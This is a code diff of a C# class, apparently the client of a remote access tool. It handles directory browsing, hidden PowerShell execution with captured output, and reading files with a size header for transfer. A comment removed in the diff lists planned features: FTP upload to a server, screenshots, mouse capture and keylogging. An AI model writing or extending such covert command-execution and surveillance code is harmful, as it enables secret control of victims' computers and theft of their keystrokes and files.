@@ -8,21 +8,17 @@ using System.Collections.Generic;
 using System.Drawing;
 using System.Diagnostics;
 
-/** FEATURES
- * [x] directory navigation (dir, cd)
- * [ ] ftp (open port, send ip+port to server, up- & download)
- * [ ] screenshot utility
- * [ ] get mouse input / position
- * [ ] log da keys
+/** Class for specific, abstracted function.
+ * -> handles local Path, Exec and File logic
  */
 
 namespace da_box
 {
     public class Box
     {
-        private string _path;
-        private List<string> dirs;
-        private List<string> fils;
+        public string _path;
+        private List<string> dirs; // Directories @ PATH
+        private List<string> fils; // Files @ PATH
 
         private void Initialize(string path = "")
         {
@@ -44,8 +40,12 @@ namespace da_box
             Initialize(path);
         }
 
+        /* Print out current dir. and it's conntents */
         public string Dir()
         {
+            /* Refresh path. */
+            Initialize(_path);
+
             string output = _path + "\n";
             
             foreach (var dir in dirs)   output += dir + "\n";
@@ -54,9 +54,7 @@ namespace da_box
             return output;
         }
 
-        /**
-         * 
-         */
+        /* Navigate PATH */
         public bool Cd(string d)
         {
             if (d == "..")
@@ -83,19 +81,34 @@ namespace da_box
             return false;
         }
 
-        public bool RunCommand(string cmd)
+        /* Start an instance of powershell with the given command(s)
+         * and return the output                                        */
+        public string CMD(string command)
         {
-            try { Process.Start("cmd", "/C " + cmd); return true;  }
-            catch                                  { return false; }
+            Process cmd = new Process();
+            cmd.StartInfo.FileName = "powershell.exe";
+            cmd.StartInfo.RedirectStandardInput = true;
+            cmd.StartInfo.RedirectStandardOutput = true;
+            cmd.StartInfo.CreateNoWindow = true;
+            cmd.StartInfo.UseShellExecute = false;
+            cmd.Start();
+
+            cmd.StandardInput.WriteLine( command );
+            cmd.StandardInput.Flush();
+            cmd.StandardInput.Close();
+            cmd.WaitForExit();
+
+            return cmd.StandardOutput.ReadToEnd();
         }
 
-        public string FileToByte(string file)
+        /* Read a file to string and prepend `headerSize` */
+        public string FileToString(string file)
         {
             /* headerSize ... */
             if (DoesFileExist(file))
-                return (5 + file.Length + 3).ToString() + " " + File.ReadAllText(_path + file);
+                return (5 + file.Length + 3).ToString() + " " + File.ReadAllText(_path + "\\" + file);
             
-            return "empty";
+            return "0 empty"; // File not found.
         }
     }
 }
